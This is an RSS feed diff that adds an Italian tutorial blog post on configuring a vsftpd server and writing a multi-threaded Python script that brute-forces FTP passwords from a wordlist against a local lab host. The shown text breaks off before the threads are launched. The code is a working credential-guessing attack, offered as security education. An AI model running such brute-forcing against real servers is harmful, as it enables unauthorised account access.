@@ -426,6 +426,318 @@ Detto questo, happy coding e sopratutto, happy hacking 👽.&lt;/p&gt;
     </item>
     
     <item>
+      <title>Brute Force di un Server FTP</title>
+      <link>https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/</guid>
+      <description>Table Of Contents:
+ Basi sul Protocollo FTP Configurazione di un Server FTP con Vsftpd Brute Forcing delle credenziali di un server FTP con Python Prova sul Campo   In questo post andrò a spiegare come è possibile creare uno script per fare il brute forcing delle credenziali (in particolare la password) di un server FTP. Prima di tutto facciamo chiarezza su cos&amp;rsquo;è il protocollo FTP.
+Basi sul Protocollo FTP Ftp è l’acronimo di File Transfer Protocol esso è un protocollo che permette di trasferire un file dalla rete al singolo client (server) e viceversa, esso però permette anche la navigazione veloce nella struttura di un server web dove sono presenti file.</description>
+      <content>&lt;p&gt;&lt;strong&gt;Table Of Contents&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#basi-sul-protocollo-ftp&#34;&gt;Basi sul Protocollo FTP&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#configurazione-di-un-server-ftp-con-vsftpd&#34;&gt;Configurazione di un Server FTP con Vsftpd&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#brute-forcing-delle-credenziali-di-un-server-ftp-con-python&#34;&gt;Brute Forcing delle credenziali di un server FTP con Python&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#prova-sul-campo&#34;&gt;Prova sul Campo&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;In questo post andrò a spiegare come è possibile creare uno script per fare il brute forcing delle credenziali (in particolare la password) di un server FTP. Prima di tutto facciamo chiarezza su cos&amp;rsquo;è il protocollo FTP.&lt;/p&gt;
+&lt;h1 id=&#34;basi-sul-protocollo-ftp&#34;&gt;Basi sul Protocollo FTP&lt;/h1&gt;
+&lt;p&gt;Ftp è l’acronimo di File Transfer Protocol esso è un protocollo che permette di trasferire un file dalla rete al singolo client (server) e viceversa, esso però permette anche la navigazione veloce nella struttura di un server web dove sono presenti file. É uno dei protocolli più vecchi di Internet. Già a partire dal 1974 si inizia a lavorare con la tecnologia di trasmissione dei file completi. Nel 1985 si definisce con esattezza il FTP nel documento Request For Comments 959. Il protocollo ftp è un protocollo indipendente quindi è possibile usarlo su qualsiasi computer, indipendentemente dal sistema operativo che vi si usa. Questo servizio viene usato anche nella posta odierna, questo perché, anche essendo un protocollo datato permette il trasferimento di file di notevoli dimensioni. C’è una distinzione da fare tra ftp pubblico e ftp privato:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;ftp pubblico&lt;/strong&gt;: viene definito tale quando un client esegue il download su un sito web, o su un qualsiasi sito che permette di scaricare file durante la navigazione in questo caso può essere chiamato anche anonymous ftp.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;ftp privato&lt;/strong&gt;: se ad esempio un provider mette a disposizione uno spazio web, directory comprese per fare il download e upload dei file html esso viene definito ftp privato o full service ftp.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Il File Transfer Protocol viene eseguito all’interno del livello applicativo dello stack TCP/IP, ossia nello stesso livello di HTTP o POP. Questi protocolli si caratterizzano per il loro funzionamento in combinazione con i programmi, come browser o client di posta elettronica, grazie ai quali svolgono la propria funzione. Anche per il File Transfer Protocol esistono dei software FTP dedicati.
+Per stabilire una connessione FTP vengono aperti due canali. Per prima cosa client e server creano un canale di controllo tramite la porta 21, tramite il quale il client invia comandi al server e questo risponde con i codici di stato. Dopodiché entrambi possono creare un canale dati che trasporta i file desiderati da una parte all’altra. Il protocollo controlla eventuali errori.&lt;/p&gt;
+&lt;p&gt;È necessario distinguere però tra FTP attivo e passivo. Nella variante attiva è il client a stabilire la connessione, come spiegato, attraverso la porta 21 e a comunicare al server su quale porta lato cliente questo può inviare la propria risposta. Ma se il client è protetto da un firewall, allora il server non potrà inviare alcuna risposta in quanto tutte le connessioni esterne sono bloccate. Proprio per questi casi è stata sviluppata una modalità passiva, che prevede che sia il server a rendere nota la porta tramite la quale il client può creare il canale dati. In questo modo, essendo il client a iniziare la connessione, il firewall non blocca il trasferimento dei dati.
+Il File Transfer Protocol dispone di vari comandi e codici di stato. Grazie a ben 32 comandi totali - non sempre necessariamente tutti implementati dal server - il client istruisce il server su qual è l’operazione desiderata:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;caricare o scaricare file&lt;/li&gt;
+&lt;li&gt;organizzare cartelle&lt;/li&gt;
+&lt;li&gt;cancellare file&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Il server risponde ogni volta con un codice di stato che serve a informare se il comando può essere eseguito o meno con successo.
+Il File Transfer Protocol originale venne creato senza misure di sicurezza preventive. All’epoca Internet era ancora molto piccolo e la cybercriminalità non esisteva ancora. Ma col passare del tempo i rischi di sicurezza associati all’utilizzo del FTP sono diventati numerosi, venendo le informazioni trasmesse senza essere state precedentemente criptate.&lt;/p&gt;
+&lt;p&gt;Perciò sono state sviluppate due varianti sicure, che da allora continuano a farsi concorrenza: FTPS e SFTP. La prima variante consiste nel FTP over SSL. La connessione viene stabilita utilizzando i Secure Socket Layers (SSL), ossia il Transport Layer Security (TLS), che serve a criptare lo scambio di dati.&lt;br&gt;
+Il SSH File Transfer Protocol (SFTP), al contrario, utilizza il Secure Shell (SSH) per garantire una trasmissione sicura dei dati.&lt;/p&gt;
+&lt;p&gt;Anche in questo caso la connessione è criptata. Ma mentre il FTPS necessita di due connessioni, al SFTP ne basta una sola. In compenso però bisogna utilizzare un programma aggiuntivo.
+Vsftpd (acronimo di Very Secure FTP daemon) è un server FTP per sistemi simili a Unix, incluso Linux. È il server FTP predefinito nelle distribuzioni Linux Ubuntu, CentOS, Fedora, NimbleX, Slackware e RHEL. È concesso in licenza con GNU General Public License, supporta IPv6, TLS e FTPS.&lt;/p&gt;
+&lt;p&gt;Ora che abbiamo compreso cos&amp;rsquo;è il protocollo FTP e a cosa serve, andiamo a vedere come configurare un server FTP con Linux.&lt;/p&gt;
+&lt;h1 id=&#34;configurazione-di-un-server-ftp-con-vsftpd&#34;&gt;Configurazione di un Server FTP con Vsftpd&lt;/h1&gt;
+&lt;p&gt;Il pacchetto vsftpd è disponibile nei repository standard. Esegui i seguenti comandi per installarlo:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo apt update
+$ sudo apt install vsftpd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Al termine dell&amp;rsquo;installazione, il servizio ftp verrà avviato automaticamente.  Stampa lo stato del servizio per confermare:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo systemctl status vsftpd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;È possibile configurare il server vsftpd modificando il file &lt;code&gt;/etc/vsftpd.conf&lt;/code&gt;. Il file di configurazione contiene la documentazione dettagliata per la maggior parte delle impostazioni. Visita la pagina ufficiale vsftpd per vedere tutte le opzioni disponibili.
+Per iniziare, apri il file di configurazione vsftpd:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo nano /etc/vsftpd.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Per assicurarti che solo gli utenti locali possano connettersi al server FTP, cerca le direttive anonymous_enable e local_enable e assicurati che le tue impostazioni corrispondano alle seguenti righe:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;anonymous_enable&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;NO
+local_enable&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;YES
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Creeremo un nuovo utente per testare il server FTP. Crea un nuovo utente chiamato newftpuser:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo adduser newftpuser
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Impostare la password utente quando richiesto. Aggiungere l&amp;rsquo;utente all&amp;rsquo;elenco degli utenti FTP consentiti:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;newftpuser&amp;#34;&lt;/span&gt; | sudo tee -a /etc/vsftpd.user_list
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Crea l&amp;rsquo;albero della directory FTP e imposta le autorizzazioni corrette:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo mkdir -p /home/newftpuser/ftp/upload
+$ sudo chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;550&lt;/span&gt; /home/newftpuser/ftp
+$ sudo chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;750&lt;/span&gt; /home/newftpuser/ftp/upload
+$ sudo chown -R newftpuser: /home/newftpuser/ftp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Per il nostro fine vanno bene queste configurazioni, ma il file &lt;code&gt;/etc/vsftpd.conf&lt;/code&gt; ne ha moltre altre, quindi invito chi fosse interessato ad approfondire meglio l&amp;rsquo;argomento.&lt;/p&gt;
+&lt;h1 id=&#34;brute-forcing-delle-credenziali-di-un-server-ftp-con-python&#34;&gt;Brute Forcing delle credenziali di un server FTP con Python&lt;/h1&gt;
+&lt;p&gt;Useremo il modulo ftplib integrato in Python. Tuttavia, useremo colorama per stampare a colori in Python:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pip3 install colorama
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Inizia a scrivere il codice:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ftplib
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; colorama &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Fore, init &lt;span style=&#34;color:#75715e&#34;&gt;# for fancy colors, nothing else&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# init the console for colors (Windows)&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# init()&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# hostname or IP address of the FTP server&lt;/span&gt;
+host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.113&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# username of the FTP server, root as default for linux&lt;/span&gt;
+user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# port of FTP, aka 21&lt;/span&gt;
+port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Quindi il server locale si trova a 192.168.1.113, ho creato anche un nome utente &amp;ldquo;test&amp;rdquo;, e poi specifichiamo la porta dell&amp;rsquo;FTP, che è la 21.&lt;/p&gt;
+&lt;p&gt;Ora scriviamo la funzione principale che accetta una password negli argomenti e restituisce se le credenziali sono corrette:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_correct&lt;/span&gt;(password):
+    &lt;span style=&#34;color:#75715e&#34;&gt;# initialize the FTP server object&lt;/span&gt;
+    server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FTP()
+    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Trying&amp;#34;&lt;/span&gt;, password)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+        &lt;span style=&#34;color:#75715e&#34;&gt;# tries to connect to FTP server with a timeout of 5&lt;/span&gt;
+        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
+        &lt;span style=&#34;color:#75715e&#34;&gt;# login using the credentials (user &amp;amp; password)&lt;/span&gt;
+        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(user, password)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error_perm:
+        &lt;span style=&#34;color:#75715e&#34;&gt;# login failed, wrong credentials&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+        &lt;span style=&#34;color:#75715e&#34;&gt;# correct credentials&lt;/span&gt;
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Found credentials:&amp;#34;&lt;/span&gt;, password, Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Niente di speciale; inizializziamo l&amp;rsquo;oggetto server FTP usando ftplib.FTP() e poi ci connettiamo a quell&amp;rsquo;host e proviamo ad accedere, questo solleverà un&amp;rsquo;eccezione ogni volta che le credenziali non sono corrette, quindi se viene sollevata, restituiremo solo False e True altrimenti.&lt;/p&gt;
+&lt;p&gt;Useremo un elenco di password conosciute. Sentiti libero di usarne uno qualsiasi, oppure puoi generare il tuo elenco di parole personalizzato usando Crunch. Tuttavia, utilizzeremo l&amp;rsquo;elenco delle password di Nmap che contiene circa 5000 password. Se sei su Kali Linux, si trova in &amp;ldquo;/usr/share/wordlists/nmap.lst&amp;rdquo;. Altrimenti, prendilo &lt;a href=&#34;https://github.com/x4nth055/pythoncode-tutorials/blob/master/ethical-hacking/ftp-cracker/wordlist.txt&#34;&gt;qui&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Una volta che lo hai, mettilo nella directory corrente e chiamalo wordlist.txt e usa il seguente codice:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# read the wordlist of passwords&lt;/span&gt;
+passwords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wordlist.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Passwords to try:&amp;#34;&lt;/span&gt;, len(passwords))
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora tutto ciò che dobbiamo fare è eseguire la funzione di cui sopra su tutte queste password:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# iterate over passwords one by one&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# if the password is found, break out of the loop&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; passwords:
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; is_correct(password):
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora, questo codice va bene, ma è molto lento. Utilizza un solo thread che tenta in sequenza una connessione FTP su ciascuna password.&lt;/p&gt;
+&lt;p&gt;Usiamo i thread per accelerare questo processo; il seguente codice è quello completo che utilizza il multi-threading:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ftplib
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; threading &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Thread
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; queue
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; colorama &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Fore, init &lt;span style=&#34;color:#75715e&#34;&gt;# for fancy colors, nothing else&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# init the console for colors (for Windows)&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# init()&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# initialize the queue&lt;/span&gt;
+q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; queue&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Queue()
+&lt;span style=&#34;color:#75715e&#34;&gt;# number of threads to spawn&lt;/span&gt;
+n_threads &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# hostname or IP address of the FTP server&lt;/span&gt;
+host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.113&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# username of the FTP server, root as default for linux&lt;/span&gt;
+user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# port of FTP, aka 21&lt;/span&gt;
+port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;connect_ftp&lt;/span&gt;():
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; q
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
+        &lt;span style=&#34;color:#75715e&#34;&gt;# get the password from the queue&lt;/span&gt;
+        password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
+        &lt;span style=&#34;color:#75715e&#34;&gt;# initialize the FTP server object&lt;/span&gt;
+        server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FTP()
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Trying&amp;#34;&lt;/span&gt;, password)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+            &lt;span style=&#34;color:#75715e&#34;&gt;# tries to connect to FTP server with a timeout of 5&lt;/span&gt;
+            server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
+            &lt;span style=&#34;color:#75715e&#34;&gt;# login using the credentials (user &amp;amp; password)&lt;/span&gt;
+            server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(user, password)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error_perm:
+            &lt;span style=&#34;color:#75715e&#34;&gt;# login failed, wrong credentials&lt;/span&gt;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+            &lt;span style=&#34;color:#75715e&#34;&gt;# correct credentials&lt;/span&gt;
+            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Found credentials: &amp;#34;&lt;/span&gt;)
+            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Host: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;host&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;User: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;user&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Password: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;password&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+            &lt;span style=&#34;color:#75715e&#34;&gt;# we found the password, let&amp;#39;s clear the queue&lt;/span&gt;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mutex:
+                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;queue&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;clear()
+                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;all_tasks_done&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;notify_all()
+                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unfinished_tasks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;finally&lt;/span&gt;:
+            &lt;span style=&#34;color:#75715e&#34;&gt;# notify the queue that the task is completed for this password&lt;/span&gt;
+            q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;task_done()
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# read the wordlist of passwords&lt;/span&gt;
+passwords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wordlist.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Passwords to try:&amp;#34;&lt;/span&gt;, len(passwords))
+&lt;span style=&#34;color:#75715e&#34;&gt;# put all passwords to the queue&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; passwords:
+    q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;put(password)
+&lt;span style=&#34;color:#75715e&#34;&gt;# create `n_threads` that runs that function&lt;/span&gt;
